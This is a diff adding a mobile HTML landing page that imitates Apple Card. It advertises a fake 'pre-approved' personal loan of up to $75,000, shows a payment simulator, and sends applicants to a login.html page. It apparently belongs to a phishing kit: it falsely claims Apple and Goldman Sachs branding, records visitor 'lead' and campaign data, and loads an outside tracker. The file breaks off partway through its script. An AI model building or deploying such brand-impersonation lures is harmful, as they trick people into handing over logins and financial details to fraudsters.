@@ -1,0 +1,1087 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+<script src="tracker.js"></script>
+<meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Apple Card — The card that simplifies your life</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+
+        :root {
+            --apple-black: #1D1D1F;
+            --apple-white: #F5F5F7;
+            --apple-blue: #0071E3;
+            --apple-blue-hover: #0077ED;
+            --gray-50: #FAFAFA;
+            --gray-100: #F5F5F7;
+            --gray-200: #E8E8ED;
+            --gray-300: #D2D2D7;
+            --gray-400: #86868B;
+            --gray-500: #6E6E73;
+            --gray-600: #424245;
+            --gray-700: #333336;
+            --gray-800: #1D1D1F;
+            --success: #34C759;
+            --warning: #FF9F0A;
+            --error: #FF3B30;
+            --surface-primary: #FFFFFF;
+            --surface-secondary: #F5F5F7;
+            --shadow-sm: 0 1px 3px rgba(0,0,0,0.08);
+            --shadow-md: 0 4px 12px rgba(0,0,0,0.08);
+            --shadow-lg: 0 8px 30px rgba(0,0,0,0.12);
+            --shadow-card: 0 2px 8px rgba(0,0,0,0.06);
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Inter', 'Helvetica Neue', Arial, sans-serif;
+            background: var(--surface-secondary);
+            color: var(--apple-black);
+            line-height: 1.5;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+            overflow-x: hidden;
+        }
+
+        .page-wrapper {
+            max-width: 520px;
+            margin: 0 auto;
+            min-height: 100vh;
+            background: var(--surface-primary);
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* ===== NAV ===== */
+        .nav {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 16px 24px;
+            background: rgba(255,255,255,0.72);
+            backdrop-filter: blur(20px) saturate(180%);
+            -webkit-backdrop-filter: blur(20px) saturate(180%);
+            border-bottom: 0.5px solid var(--gray-200);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .nav-logo {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .nav-logo img {
+            width: 28px;
+            height: 34px;
+        }
+
+        .nav-logo span {
+            font-size: 1.125rem;
+            font-weight: 600;
+            color: var(--apple-black);
+            letter-spacing: -0.02em;
+        }
+
+        .nav-simulate-btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            padding: 8px 18px;
+            border-radius: 999px;
+            background: var(--apple-black);
+            color: #fff;
+            font-size: 0.8125rem;
+            font-weight: 600;
+            text-decoration: none;
+            letter-spacing: -0.01em;
+            transition: background 0.2s ease;
+        }
+
+        .nav-simulate-btn:hover {
+            background: var(--gray-600);
+        }
+
+        /* ===== HERO ===== */
+        .hero {
+            padding: 48px 24px 40px;
+            text-align: center;
+            position: relative;
+            background: linear-gradient(180deg, #FFFFFF 0%, var(--gray-100) 100%);
+        }
+
+        .hero-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 6px 14px;
+            background: rgba(0,113,227,0.08);
+            border-radius: 20px;
+            font-size: 0.75rem;
+            font-weight: 600;
+            color: var(--apple-blue);
+            margin-bottom: 24px;
+            animation: fadeInUp 0.6s ease-out;
+        }
+
+        .hero-value-block {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 2px;
+            margin-bottom: 20px;
+            animation: fadeInUp 0.8s ease-out 0.25s both;
+        }
+
+        .hero-value-label {
+            font-size: 0.75rem;
+            font-weight: 500;
+            color: var(--gray-500);
+            text-transform: uppercase;
+            letter-spacing: 0.04em;
+        }
+
+        .hero-value-amount {
+            font-size: 1.75rem;
+            font-weight: 800;
+            color: var(--apple-black);
+            letter-spacing: -0.02em;
+        }
+
+        .hero-visual-row {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            flex-wrap: wrap;
+            margin-bottom: 8px;
+            animation: fadeInUp 0.8s ease-out 0.35s both;
+        }
+
+        .visual-coin {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            font-weight: 700;
+            font-size: 0.9375rem;
+            color: var(--apple-blue);
+            background: rgba(0,113,227,0.08);
+            flex-shrink: 0;
+        }
+
+        .visual-wordmark {
+            font-size: 0.75rem;
+            font-weight: 600;
+            color: var(--gray-500);
+            background: var(--gray-100);
+            padding: 6px 12px;
+            border-radius: 20px;
+            white-space: nowrap;
+        }
+
+        .hero-badge svg {
+            width: 14px;
+            height: 14px;
+        }
+
+        .simulator-card {
+            margin: 0 auto 32px;
+            width: 100%;
+            max-width: 380px;
+            background: linear-gradient(135deg, var(--apple-black) 0%, #2C2C2E 100%);
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.15), 0 8px 20px rgba(0,0,0,0.1);
+            padding: 28px 24px;
+            text-align: left;
+            animation: fadeInUp 0.8s ease-out 0.1s both;
+        }
+
+        .simulator-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 12px;
+        }
+
+        .simulator-label {
+            font-size: 0.8125rem;
+            font-weight: 500;
+            color: rgba(255,255,255,0.6);
+        }
+
+        .simulator-value {
+            font-size: 1.25rem;
+            font-weight: 700;
+            color: #fff;
+            letter-spacing: -0.02em;
+        }
+
+        .simulator-slider {
+            -webkit-appearance: none;
+            appearance: none;
+            width: 100%;
+            height: 4px;
+            border-radius: 2px;
+            background: rgba(255,255,255,0.15);
+            margin-bottom: 20px;
+            cursor: pointer;
+        }
+
+        .simulator-slider::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            appearance: none;
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            background: var(--apple-blue);
+            box-shadow: 0 2px 6px rgba(0,0,0,0.3);
+            cursor: pointer;
+        }
+
+        .simulator-slider::-moz-range-thumb {
+            width: 20px;
+            height: 20px;
+            border: none;
+            border-radius: 50%;
+            background: var(--apple-blue);
+            box-shadow: 0 2px 6px rgba(0,0,0,0.3);
+            cursor: pointer;
+        }
+
+        .simulator-terms {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 20px;
+        }
+
+        .term-btn {
+            flex: 1;
+            padding: 8px 4px;
+            background: rgba(255,255,255,0.08);
+            border: 1px solid rgba(255,255,255,0.12);
+            border-radius: 10px;
+            color: rgba(255,255,255,0.7);
+            font-size: 0.8125rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .term-btn:hover {
+            background: rgba(255,255,255,0.14);
+        }
+
+        .term-btn.active {
+            background: var(--apple-blue);
+            border-color: var(--apple-blue);
+            color: #fff;
+        }
+
+        .simulator-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            padding-top: 16px;
+            border-top: 1px solid rgba(255,255,255,0.1);
+        }
+
+        .simulator-stat {
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
+
+        .simulator-stat-label {
+            font-size: 0.6875rem;
+            color: rgba(255,255,255,0.5);
+            line-height: 1.3;
+        }
+
+        .simulator-stat-value {
+            font-size: 1rem;
+            font-weight: 700;
+            color: #fff;
+            letter-spacing: -0.01em;
+        }
+
+        .hero h1 {
+            font-size: 2rem;
+            font-weight: 700;
+            letter-spacing: -0.03em;
+            line-height: 1.15;
+            color: var(--apple-black);
+            margin-bottom: 12px;
+            animation: fadeInUp 0.8s ease-out 0.2s both;
+        }
+
+        .hero p {
+            font-size: 1.0625rem;
+            color: var(--gray-500);
+            line-height: 1.5;
+            max-width: 380px;
+            margin: 0 auto 28px;
+            animation: fadeInUp 0.8s ease-out 0.3s both;
+        }
+
+        .hero-cta {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            width: 100%;
+            max-width: 340px;
+            padding: 16px 32px;
+            background: var(--apple-blue);
+            color: #fff;
+            border: none;
+            border-radius: 14px;
+            font-size: 1.0625rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+            text-decoration: none;
+            animation: fadeInUp 0.8s ease-out 0.4s both;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .hero-cta:hover {
+            background: var(--apple-blue-hover);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(0,113,227,0.35);
+        }
+
+        .hero-cta:active {
+            transform: translateY(0);
+        }
+
+        .hero-cta svg {
+            width: 18px;
+            height: 18px;
+            transition: transform 0.3s ease;
+        }
+
+        .hero-cta:hover svg {
+            transform: translateX(3px);
+        }
+
+        .hero-cta::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 60%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.15), transparent);
+            animation: shimmer 3s ease-in-out infinite;
+        }
+
+        /* ===== BENEFITS ===== */
+        .section {
+            padding: 40px 24px;
+        }
+
+        .section-label {
+            font-size: 0.75rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.08em;
+            color: var(--apple-blue);
+            margin-bottom: 8px;
+        }
+
+        .section-title {
+            font-size: 1.5rem;
+            font-weight: 700;
+            letter-spacing: -0.02em;
+            color: var(--apple-black);
+            margin-bottom: 8px;
+        }
+
+        .section-subtitle {
+            font-size: 0.9375rem;
+            color: var(--gray-500);
+            margin-bottom: 28px;
+            line-height: 1.5;
+        }
+
+        .benefits-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+        }
+
+        .benefit-card {
+            background: var(--surface-primary);
+            border: 1px solid var(--gray-200);
+            border-radius: 16px;
+            padding: 20px 16px;
+            text-align: center;
+            transition: all 0.3s ease;
+            opacity: 0;
+            transform: translateY(16px);
+        }
+
+        .benefit-card.visible {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .benefit-card:hover {
+            border-color: var(--apple-blue);
+            box-shadow: var(--shadow-md);
+            transform: translateY(-2px);
+        }
+
+        .benefit-icon {
+            width: 48px;
+            height: 48px;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 12px;
+        }
+
+        .benefit-icon svg {
+            width: 24px;
+            height: 24px;
+        }
+
+        .benefit-icon.blue { background: rgba(0,113,227,0.1); }
+        .benefit-icon.blue svg { fill: var(--apple-blue); }
+        .benefit-icon.green { background: rgba(52,199,89,0.1); }
+        .benefit-icon.green svg { fill: var(--success); }
+        .benefit-icon.purple { background: rgba(175,82,222,0.1); }
+        .benefit-icon.purple svg { fill: #AF52DE; }
+        .benefit-icon.orange { background: rgba(255,159,10,0.1); }
+        .benefit-icon.orange svg { fill: var(--warning); }
+
+        .benefit-card h3 {
+            font-size: 0.9375rem;
+            font-weight: 600;
+            color: var(--apple-black);
+            margin-bottom: 4px;
+        }
+
+        .benefit-card p {
+            font-size: 0.8125rem;
+            color: var(--gray-500);
+            line-height: 1.4;
+        }
+
+        /* ===== HOW IT WORKS ===== */
+        .steps-section {
+            background: var(--gray-100);
+        }
+
+        .steps-list {
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+
+        .step-item {
+            display: flex;
+            align-items: flex-start;
+            gap: 16px;
+            opacity: 0;
+            transform: translateY(16px);
+        }
+
+        .step-item.visible {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .step-number {
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            background: var(--apple-blue);
+            color: #fff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.875rem;
+            font-weight: 600;
+            flex-shrink: 0;
+        }
+
+        .step-content h3 {
+            font-size: 0.9375rem;
+            font-weight: 600;
+            color: var(--apple-black);
+            margin-bottom: 2px;
+        }
+
+        .step-content p {
+            font-size: 0.8125rem;
+            color: var(--gray-500);
+            line-height: 1.4;
+        }
+
+        /* ===== STATS ===== */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 12px;
+        }
+
+        .stat-card {
+            text-align: center;
+            padding: 20px 8px;
+            background: var(--surface-primary);
+            border-radius: 16px;
+            border: 1px solid var(--gray-200);
+            opacity: 0;
+            transform: translateY(16px);
+        }
+
+        .stat-card.visible {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .stat-number {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: var(--apple-black);
+            letter-spacing: -0.02em;
+            line-height: 1.2;
+        }
+
+        .stat-label {
+            font-size: 0.6875rem;
+            color: var(--gray-500);
+            margin-top: 4px;
+            line-height: 1.3;
+        }
+
+        /* ===== FEATURES HIGHLIGHT ===== */
+        .feature-highlight {
+            background: linear-gradient(135deg, var(--apple-black) 0%, #2C2C2E 100%);
+            padding: 40px 24px;
+            text-align: center;
+            color: #fff;
+        }
+
+        .feature-highlight .section-label {
+            color: var(--apple-blue);
+        }
+
+        .feature-highlight .section-title {
+            color: #fff;
+        }
+
+        .feature-highlight .section-subtitle {
+            color: var(--gray-400);
+        }
+
+        .feature-list {
+            text-align: left;
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+
+        .feature-item {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            padding: 14px 16px;
+            background: rgba(255,255,255,0.06);
+            border-radius: 12px;
+            border: 1px solid rgba(255,255,255,0.08);
+            opacity: 0;
+            transform: translateX(-16px);
+        }
+
+        .feature-item.visible {
+            opacity: 1;
+            transform: translateX(0);
+        }
+
+        .feature-item svg {
+            width: 20px;
+            height: 20px;
+            fill: var(--success);
+            flex-shrink: 0;
+        }
+
+        .feature-item span {
+            font-size: 0.875rem;
+            font-weight: 500;
+            color: rgba(255,255,255,0.9);
+        }
+
+        /* ===== BOTTOM CTA ===== */
+        .bottom-cta {
+            padding: 32px 24px 48px;
+            text-align: center;
+            background: var(--surface-primary);
+        }
+
+        .bottom-cta h2 {
+            font-size: 1.5rem;
+            font-weight: 700;
+            letter-spacing: -0.02em;
+            color: var(--apple-black);
+            margin-bottom: 8px;
+        }
+
+        .bottom-cta p {
+            font-size: 0.9375rem;
+            color: var(--gray-500);
+            margin-bottom: 24px;
+        }
+
+        .bottom-cta .hero-cta {
+            animation: none;
+            opacity: 1;
+        }
+
+        .security-badges {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 20px;
+            margin-top: 20px;
+            flex-wrap: wrap;
+        }
+
+        .security-badge {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 0.75rem;
+            color: var(--gray-400);
+        }
+
+        .security-badge svg {
+            width: 14px;
+            height: 14px;
+            fill: var(--gray-400);
+        }
+
+        /* ===== FOOTER ===== */
+        .footer {
+            padding: 24px;
+            text-align: center;
+            border-top: 0.5px solid var(--gray-200);
+            background: var(--surface-primary);
+        }
+
+        .footer p {
+            font-size: 0.6875rem;
+            color: var(--gray-400);
+            line-height: 1.6;
+        }
+
+        /* ===== ANIMATIONS ===== */
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes shimmer {
+            0% { left: -100%; }
+            50% { left: 200%; }
+            100% { left: 200%; }
+        }
+
+        @keyframes pulse-soft {
+            0%, 100% { box-shadow: 0 0 0 0 rgba(0,113,227,0.3); }
+            50% { box-shadow: 0 0 0 10px rgba(0,113,227,0); }
+        }
+
+        /* Transition helper */
+        .animate-item {
+            transition: opacity 0.6s ease-out, transform 0.6s ease-out;
+        }
+
+        @media (max-width: 380px) {
+            .hero h1 { font-size: 1.75rem; }
+            .term-btn { font-size: 0.75rem; padding: 8px 2px; }
+            .stats-grid { gap: 8px; }
+            .stat-number { font-size: 1.25rem; }
+        }
+    </style>
+</head>
+<body>
+    <div class="page-wrapper">
+        <!-- Nav -->
+        <nav class="nav">
+            <div class="nav-logo">
+                <img src="assets/images/black.svg" alt="" style="width:28px;height:34px">
+                <span>Card</span>
+            </div>
+            <a href="#simulador" class="nav-simulate-btn">Simular</a>
+        </nav>
+
+        <!-- Hero -->
+        <section class="hero">
+            <div class="hero-badge">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg>
+                Apple Credit Pre-Approved
+            </div>
+
+            <h1>Personal Loan In Your Account</h1>
+            <p>Fast cash, zero bureaucracy, and competitive fixed rates directly to your Apple Wallet or Bank Account.</p>
+
+            <div class="hero-value-block">
+                <span class="hero-value-label">Limit up to</span>
+                <span class="hero-value-amount">$75,000</span>
+            </div>
+
+            <div class="hero-visual-row" aria-hidden="true">
+                <span class="visual-coin">$</span>
+                <span class="visual-coin">€</span>
+                <span class="visual-wordmark">Apple Credit</span>
+            </div>
+
+            <div class="simulator-card" id="simulador">
+                <div class="simulator-header">
+                    <span class="simulator-label">Credit Amount</span>
+                    <span class="simulator-value" id="simAmountValue">$10,000</span>
+                </div>
+                <input type="range" id="simAmountSlider" class="simulator-slider" min="1000" max="50000" step="500" value="10000" aria-label="Credit amount">
+
+                <div class="simulator-terms" id="simTerms">
+                    <button type="button" class="term-btn" data-term="12">12 mo</button>
+                    <button type="button" class="term-btn active" data-term="24">24 mo</button>
+                    <button type="button" class="term-btn" data-term="36">36 mo</button>
+                    <button type="button" class="term-btn" data-term="48">48 mo</button>
+                </div>
+
+                <div class="simulator-grid">
+                    <div class="simulator-stat">
+                        <span class="simulator-stat-label">Estimated Monthly Payment</span>
+                        <span class="simulator-stat-value" id="simMonthlyPayment">$441</span>
+                    </div>
+                    <div class="simulator-stat">
+                        <span class="simulator-stat-label">Estimated Rate</span>
+                        <span class="simulator-stat-value" id="simRate">4.5% APR</span>
+                    </div>
+                </div>
+            </div>
+
+            <a href="login.html" class="hero-cta" id="mainCta">
+                <span id="mainCtaLabel">Apply for Apple Card</span>
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
+            </a>
+        </section>
+
+        <!-- Benefits -->
+        <section class="section">
+            <div class="section-label">Benefits</div>
+            <h2 class="section-title">Designed for you.</h2>
+            <p class="section-subtitle">Every detail crafted to deliver the best financial experience.</p>
+
+            <div class="benefits-grid">
+                <div class="benefit-card animate-item">
+                    <div class="benefit-icon blue">
+                        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 17h-2v-2h2v2zm0-4h-2V7h2v8z"/></svg>
+                    </div>
+                    <h3>Up to 3% Cashback</h3>
+                    <p>Earn Daily Cash on every purchase, credited every day.</p>
+                </div>
+                <div class="benefit-card animate-item">
+                    <div class="benefit-icon green">
+                        <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
+                    </div>
+                    <h3>Total Security</h3>
+                    <p>No printed numbers. Data protected by Apple.</p>
+                </div>
+                <div class="benefit-card animate-item">
+                    <div class="benefit-icon purple">
+                        <svg viewBox="0 0 24 24"><path d="M17 1.01L7 1c-1.1 0-2 .9-2 2v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V3c0-1.1-.9-1.99-2-1.99zM17 19H7V5h10v14z"/></svg>
+                    </div>
+                    <h3>Apple Wallet</h3>
+                    <p>Native integration. Use with Apple Pay anywhere.</p>
+                </div>
+                <div class="benefit-card animate-item">
+                    <div class="benefit-icon orange">
+                        <svg viewBox="0 0 24 24"><path d="M11.8 10.9c-2.27-.59-3-1.2-3-2.15 0-1.09 1.01-1.85 2.7-1.85 1.78 0 2.44.85 2.5 2.1h2.21c-.07-1.72-1.12-3.3-3.21-3.81V3h-3v2.16c-1.94.42-3.5 1.68-3.5 3.61 0 2.31 1.91 3.46 4.7 4.13 2.5.6 3 1.48 3 2.41 0 .69-.49 1.79-2.7 1.79-2.06 0-2.87-.92-2.98-2.1h-2.2c.12 2.19 1.76 3.42 3.68 3.83V21h3v-2.15c1.95-.37 3.5-1.5 3.5-3.55 0-2.84-2.43-3.81-4.7-4.4z"/></svg>
+                    </div>
+                    <h3>Zero Annual Fee</h3>
+                    <p>No annual fee, no late fees, no foreign transaction fees.</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- How it works -->
+        <section class="section steps-section">
+            <div class="section-label">How it works</div>
+            <h2 class="section-title">Simple as it should be.</h2>
+            <p class="section-subtitle">Three quick steps and your Apple Card will be ready.</p>
+
+            <div class="steps-list">
+                <div class="step-item animate-item">
+                    <div class="step-number">1</div>
+                    <div class="step-content">
+                        <h3>Apply in minutes</h3>
+                        <p>Enter your basic info and complete the express credit review.</p>
+                    </div>
+                </div>
+                <div class="step-item animate-item">
+                    <div class="step-number">2</div>
+                    <div class="step-content">
+                        <h3>Get instant approval</h3>
+                        <p>See your approved limit and customize your card on the spot.</p>
+                    </div>
+                </div>
+                <div class="step-item animate-item">
+                    <div class="step-number">3</div>
+                    <div class="step-content">
+                        <h3>Physical card delivered</h3>
+                        <p>Get your titanium Apple Card sent straight to the address of your choice.</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Stats -->
+        <section class="section">
+            <div class="stats-grid">
+                <div class="stat-card animate-item">
+                    <div class="stat-number" data-target="2" data-suffix="M+">0</div>
+                    <div class="stat-label">Cards<br>approved</div>
+                </div>
+                <div class="stat-card animate-item">
+                    <div class="stat-number" data-target="4.8" data-suffix="★">0</div>
+                    <div class="stat-label">User<br>rating</div>
+                </div>
+                <div class="stat-card animate-item">
+                    <div class="stat-number" data-target="98" data-suffix="%">0</div>
+                    <div class="stat-label">Approval<br>in minutes</div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Dark Features -->
+        <section class="feature-highlight">
+            <div class="section-label">Apple Card Titanium</div>
+            <h2 class="section-title">Made of titanium.<br>Made for you.</h2>
+            <p class="section-subtitle">The most secure and elegant physical card on the market.</p>
+
+            <div class="feature-list">
+                <div class="feature-item animate-item">
+                    <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg>
+                    <span>Laser-etched titanium card</span>
+                </div>
+                <div class="feature-item animate-item">
+                    <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg>
+                    <span>No number, no CVV, no printed date</span>
+                </div>
+                <div class="feature-item animate-item">
+                    <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg>
+                    <span>Contactless with Apple Pay at any store</span>
+                </div>
+                <div class="feature-item animate-item">
+                    <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg>
+                    <span>Monthly installments on Apple products with 0% APR</span>
+                </div>
+                <div class="feature-item animate-item">
+                    <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg>
+                    <span>24/7 chat support with Apple specialists</span>
+                </div>
+            </div>
+        </section>
+
+        <!-- Bottom CTA -->
+        <section class="bottom-cta">
+            <h2>Ready to get started?</h2>
+            <p>Apply now and receive your Apple Card in just a few days.</p>
+
+            <a href="login.html" class="hero-cta">
+                Apply for Apple Card
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
+            </a>
+
+            <div class="security-badges">
+                <div class="security-badge">
+                    <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM12 17c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3-9H9V6c0-1.66 1.34-3 3-3s3 1.34 3 3v2z"/></svg>
+                    Encryption
+                </div>
+                <div class="security-badge">
+                    <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
+                    Data protected
+                </div>
+                <div class="security-badge">
+                    <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg>
+                    Delivery guaranteed
+                </div>
+            </div>
+        </section>
+
+        <!-- Footer -->
+        <footer class="footer">
+            <p>Apple Card is issued by Goldman Sachs Bank USA.<br>© 2026 Apple Inc. All rights reserved.<br>Subject to credit approval. Terms and conditions apply.</p>
+        </footer>
+    </div>
+
+    <script>
+        /* ===== UTM TRACKING ===== */
+        (function(){
+            var utmKeys = ['utm_source','utm_medium','utm_campaign','utm_content','utm_term','src','sck'];
+            var p = new URLSearchParams(window.location.search);
+            utmKeys.forEach(function(k){
+                var v = p.get(k);
+                if(v) localStorage.setItem(k, v);
+            });
+        })();
+
+        /* ===== LEAD DATA SYSTEM ===== */
+        const LeadData = {
+            _key: 'applecard_lead',
+            save(data) { localStorage.setItem(this._key, JSON.stringify(data)); },
+            load() { try { return JSON.parse(localStorage.getItem(this._key) || '{}'); } catch { return {}; } },
+            update(newData) {
+                const current = this.load();
+                const updated = { ...current, ...newData, updated_at: Date.now() };
+                if (!updated.lead_id) updated.lead_id = this._generateId();
+                this.save(updated);
+                return updated;
+            },
+            _generateId() {
+                return 'AC' + Date.now().toString(36).toUpperCase() + Math.random().toString(36).substr(2,4).toUpperCase();
+            },
+            getUtms() {
+                const utms = {};
+                ['utm_source','utm_medium','utm_campaign','utm_content','utm_term','src','sck'].forEach(k => {
+                    const v = localStorage.getItem(k);
+                    if (v) utms[k] = v;
+                });
+                return utms;
+            },
+            exportForCheckout() {
+                const data = this.load();
+                const utms = this.getUtms();
+                return { ...data, ...utms };
+            }
+        };
+
+        // Initialize lead
+        LeadData.update({ funnel_start: Date.now(), page: 'home' });
+        if (window.track) window.track('ViewContent', { content_id: 'apple-card-us', content_name: 'Apple Card', value: 22.45, currency: 'USD' });
+
+        /* ===== URL PARAM BUILDER ===== */
+        function buildUrl(base, params = {}) {
+            const url = new URL(base, window.location.href);
+            const existingParams = new URLSearchParams(window.location.search);
+            existingParams.forEach((v, k) => url.searchParams.set(k, v));
+            Object.entries(params).forEach(([k, v]) => { if (v) url.searchParams.set(k, v); });
+            return url.toString();
+        }
+
+        // Update CTA links with params
+        document.querySelectorAll('a.hero-cta').forEach(a => {
+            a.addEventListener('click', function(e) {
+                e.preventDefault();
+                window.location.href = buildUrl(this.getAttribute('href'));
+            });
+        });
+
+        /* ===== INTERSECTION OBSERVER (Scroll animations) ===== */
+        const observer = new IntersectionObserver((entries) => {
+            entries.forEach((entry, i) => {
+                if (entry.isIntersecting) {
+                    setTimeout(() => {
+                        entry.target.classList.add('visible');
+                    }, i * 80);
+                    observer.unobserve(entry.target);
+                }
+            });
+        }, { threshold: 0.15, rootMargin: '0px 0px -40px 0px' });
+
+        document.querySelectorAll('.animate-item').forEach(el => observer.observe(el));
+
+        /* ===== STAT COUNTER ANIMATION ===== */
+        const statObserver = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) {
+                    const el = entry.target.querySelector('.stat-number');
+                    if (el && !el.dataset.animated) {
+                        el.dataset.animated = '1';
+                        animateCounter(el);
+                    }
+                    statObserver.unobserve(entry.target);
+                }
+            });
+        }, { threshold: 0.5 });
+
+        document.querySelectorAll('.stat-card').forEach(el => statObserver.observe(el));
+
+        function animateCounter(el) {
+            const target = parseFloat(el.dataset.target);
+            const suffix = el.dataset.suffix || '';
+            const duration = 1500;
+            const start = performance.now();
+            const isFloat = target % 1 !== 0;
+
+            function update(now) {
+                const elapsed = now - start;
+                const progress = Math.min(elapsed / duration, 1);
+                const eased = 1 - Math.pow(1 - progress, 3);
+                const current = target * eased;
+                el.textContent = (isFloat ? current.toFixed(1) : Math.floor(current)) + suffix;
+                if (progress < 1) requestAnimationFrame(update);
+            }
+            requestAnimationFrame(update);
+        }
+
+        /* ===== CREDIT SIMULATOR ===== */
+        (function () {
+            const slider = document.getElementById('simAmountSlider');
+            const amountValueEl = document.getElementById('simAmountValue');
+            const termButtons = document.querySelectorAll('.term-btn');
+            const monthlyPaymentEl = document.getElementById('simMonthlyPayment');
+            const mainCtaLabel = document.getElementById('mainCtaLabel');
+
+            if (!slider || !mainCtaLabel) return;
+
+            const APR = 0.045;
+            let selectedTerm = parseInt(document.querySelector('.term-btn.active').dataset.term, 10);
+
+            function formatCurrency(value) {
+                return '$' + Math.round(value).toLocaleString('en-US');
+            }
+
+            function estimateMonthlyPayment(amount, termMonths) {
+                const monthlyRate = APR / 12;
+                return amount * monthlyRate / (1 - Math.pow(1 + monthlyRate, -termMonths));
+            }
+
+            function updateSimulator() {
+                const amount = parseInt(slider.value, 10);
+                const payment = estimateMonthlyPayment(amount, selectedTerm);
+
+                amountValueEl.textContent = formatCurrency(amount);
+                monthlyPaymentEl.textContent = formatCurrency(payment);
+                mainCtaLabel.textContent = `Simulate ${formatCurrency(amount)} Credit`;
+            }
+
